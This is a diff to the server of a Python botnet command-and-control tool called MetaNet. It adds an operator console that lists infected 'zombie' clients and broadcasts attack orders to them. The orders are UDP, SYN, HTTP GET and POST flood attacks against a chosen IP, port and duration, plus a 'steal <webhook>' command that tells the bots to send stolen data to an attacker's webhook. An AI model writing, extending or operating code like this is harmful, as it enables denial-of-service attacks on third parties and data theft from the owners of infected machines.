@@ -1,13 +1,15 @@
 # Server
 import os
+import ctypes
 import socket
 import random
-import threading
 import colorama
+import platform
+import threading
 from pystyle import Colors, Colorate, Center, Write, Box
 
 # Server configuration
-HOST = '127.0.0.1'
+HOST = '0.0.0.0'
 PORT = 5555
 
 colorama.init(autoreset=True)
@@ -31,8 +33,15 @@ color_list = [colorama.Fore.RED, colorama.Fore.GREEN, colorama.Fore.YELLOW, colo
 
 os.system("title MetaNet")
 
+def clear():
+    if platform.system() == "Windows":
+        os.system("cls")
+    else:
+        os.system("clear")
+
 def banner():
     global connected_clients_count
+    clear()
     x = '''
                  ╔╦╗┌─┐┌┬┐┌─┐╔╗╔┌─┐┌┬┐
                  ║║║├┤  │ ├─┤║║║├┤  │ 
@@ -44,6 +53,7 @@ def banner():
 ║               ~ Developed by @7p4n1c                ║
 ║                                                     ║
 ╚═════════════════════════════════════════════════════╝
+          Type "help" for the list of commands
     '''
     print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(x), 1))
 
@@ -53,7 +63,7 @@ def handle_client(client_socket, addr):
     global connected_clients_count
     with clients_count_lock:
         connected_clients_count += 1
-        os.system("title MetaNet {}".format(connected_clients_count))
+        ctypes.windll.kernel32.SetConsoleTitleW(f"Metanet ({connected_clients_count})")
     try:
         while True:
             # Receive data from the client
@@ -71,7 +81,7 @@ def handle_client(client_socket, addr):
     finally:
         with clients_count_lock:
             connected_clients_count -= 1
-            os.system("title MetaNet {}".format(connected_clients_count))
+            ctypes.windll.kernel32.SetConsoleTitleW(f"Metanet ({connected_clients_count})")
             clients.remove(client_socket)
             client_socket.close()
 
@@ -93,8 +103,9 @@ def send_messages():
         if message.lower() in ['list', 'ls']:
             client_info = [f'[{i+1}] {addr[0]}:{addr[1]}' for i, addr in enumerate(map(lambda x: x.getpeername()[0:2], clients))]
             if client_info:
+                clear()
                 print(Center.XCenter("""
-                   Client(s) Connected
+                   Connected Client(s)
 ─══════════════════════════☆☆══════════════════════════─
                                  
 """))
@@ -102,9 +113,131 @@ def send_messages():
                     chosen_color = random.choice(color_list)
                     print(Center.XCenter(f"{chosen_color}{zombie}"))
             else:
-                print("no clients")
+                print(Center.XCenter(f"{colorama.Fore.RED}No Clients Connected"))
+
+        elif str(message).lower() == "help":
+            clear()
+            x = '''
+                ╔╦╗┌─┐┌┬┐┌─┐╔╗╔┌─┐┌┬┐
+                ║║║├┤  │ ├─┤║║║├┤  │ 
+                ╩ ╩└─┘ ┴ ┴ ┴╝╚╝└─┘ ┴ 
+     ╚══════╦════════════════════════╦══════╝
+╔═══════════╩════════════════════════╩══════════════╗
+║      Usage: attack <Method> <IP> <Port> <Time>    ║
+║═══════════════════════════════════════════════════║
+║                [Help & Commands]                  ║
+║                                                   ║
+║        - Methods: udp, syn, get, post             ║
+║        - banner: Displays main banner             ║
+║        - ls: List connected client(s)             ║
+║═══════════════════════════════════════════════════║
+║                   Command Usage                   ║
+║═══════════════════════════════════════════════════║
+║              Steal: Steal <webhook>               ║
+╚═══════════════════════════════════════════════════╝
+
+
+            '''
+            print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(x), 1))
+
+        elif str(message) == "banner":
+            banner()
+        
+        elif str(message).startswith("attack"):
+            arguments = str(message).split()[1:]
+            try:
+                method = arguments[0]
+                if method:
+                    if method == "udp":
+                        try:
+                            ip = arguments[1]
+                            port = int(arguments[2])  
+                            sec = int(arguments[3])
+                            if ip and port and sec:
+                                broadcast(message)
+                            else:
+                                print("")
+                                print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (IP, Port, Seconds)"))
+                                print("")
+
+                        except IndexError:
+                            print("")
+                            print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (IP, Port, Seconds)"))
+                            print("")
+
+                    elif method == "syn":
+                        try:
+                            ip = arguments[1]
+                            port = int(arguments[2])  
+                            sec = int(arguments[3])
+                            if ip and port and sec:
+                                broadcast(message)
+                            else:
+                                print("")
+                                print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (IP, Port, Seconds)"))
+                                print("")
+                        except IndexError:
+                            print("")
+                            print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (IP, Port, Seconds)"))
+                            print("")
+
+                    elif method == "get":
+                        try:
+                            ip = arguments[1] 
+                            sec = int(arguments[2])
+                            if ip and sec:
+                                broadcast(message)
+                            else:
+                                print("")
+                                print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (url, seconds)"))
+                                print("")
+
+                        except IndexError:
+                            print("")
+                            print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (url, seconds)"))
+                            print("")
+
+                    elif method == "post":
+                        try:
+                            ip = arguments[1] 
+                            sec = int(arguments[2])
+                            if ip and sec:
+                                broadcast(message)
+                            else:
+                                print("")
+                                print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (url, seconds)"))
+                                print("")
+                                
+                        except IndexError:
+                            print("")
+                            print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (url, seconds)"))
+                            print("")
+                else:
+                    print("")
+                    print(Center.XCenter(f"{colorama.Fore.RED} Missing Method."))
+                    print("")
+
+            except IndexError:
+                print("")
+                print(Center.XCenter(f"{colorama.Fore.RED} Missing Method."))
+                print("")
+        
+        elif str(message).startswith("steal"):
+            arguments = str(message).split()[1:]
+            try:
+                if arguments[0]:
+                    broadcast(message)
+                else:
+                    pass
+
+            except IndexError:
+                print(Center.XCenter(f"{colorama.Fore.RED} Missing URL."))
+                print('')
+
         else:
-            broadcast(message)
+            print("")
+            print(Center.XCenter(f"{colorama.Fore.RED} Invalid Command."))
+            print("")
 
 # Function to continuously process messages from clients
 def process_messages():
